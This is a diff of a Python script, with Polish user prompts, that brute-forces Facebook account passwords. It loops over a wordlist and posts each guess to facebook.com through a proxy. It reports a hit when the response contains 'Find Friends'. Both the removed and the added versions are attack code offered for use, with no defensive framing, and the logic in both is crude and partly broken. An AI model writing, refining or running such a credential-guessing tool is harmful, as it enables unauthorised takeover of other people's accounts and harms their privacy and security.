@@ -1,53 +1,34 @@
 import requests
-from bcrypt import checkpw
-
-def verify_password(password, hashed_password):
-    return checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))
-
-def read_passwords_from_file(filename):
-    with open(filename, 'r') as file:
-        return file.read().splitlines()
 
 def brute_force(username, fb_id, passwords, proxy):
     for password in passwords:
-        # Wykonaj zapytanie do Facebooka z użyciem proxy
-        response = requests.post('https://www.facebook.com/login.php', data={
+        session = requests.Session()
+        session.proxies = {'http': proxy, 'https': proxy}
+
+        data = {
             'email': username,
-            'password': password,
-            'login': 'Log In'
-        }, proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'})
+            'pass': password
+        }
 
-        # Sprawdź odpowiedź
-        if "Nieprawidłowe hasło" not in response.text:
-            # Hasło zostało znalezione
-            print('Znaleziono hasło:', password)
-            return
+        response = session.post(f'https://www.facebook.com/{fb_id}', data=data)
 
-        # Hasło nie zostało znalezione
-        print('Nieprawidłowe hasło:', password)
+        if 'Find Friends' in response.text:
+            print(f'Success! Password found: {password}')
+            break
 
 def main():
-    # Pobierz dane użytkownika
     username = input('Podaj nazwę użytkownika: ')
     fb_id = input('Podaj identyfikator Facebooka: ')
+    password_file = input('Podaj nazw pliku z listą haseł: ')
+    proxy = 'http://user123:pass456@192.168.0.1:8080'  # Replace with your proxy details
 
-    # Pobierz nazwę pliku z listą haseł
-    filename = input('Podaj nazwę pliku z listą haseł: ')
+    with open(password_file, 'r') as file:
+        passwords = [line.strip() for line in file]
 
-    # Wczytaj listę haseł z pliku
-    passwords = read_passwords_from_file(filename)
-
-    # Podaj adres proxy
-    proxy = input('Podaj adres proxy (format: http://username:password@proxy_ip:proxy_port): ')
-
-    # Wykonaj atak siłowy z użyciem proxy
     brute_force(username, fb_id, passwords, proxy)
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
-
-
-
 
 
 
